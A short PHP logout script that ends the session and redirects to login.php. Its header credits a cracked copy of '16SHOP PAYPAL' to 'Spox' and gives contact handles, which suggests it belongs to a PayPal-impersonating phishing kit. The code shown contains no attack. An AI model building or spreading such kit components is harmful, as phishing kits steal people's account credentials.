<?php

/**
 * 16SHOP PAYPAL CRACKED BY SPOX
 * icq & telegram = @spoxcoder
 
###############################################
#$            CRACKED by Spox_dz             $#
#$   Recording doesn't  make you a Coder     $#
#$          Copyright 2020 16SHOP            $#
###############################################

**/


session_start();
session_destroy();
echo "<script type='text/javascript'>window.top.location='login.php';</script>";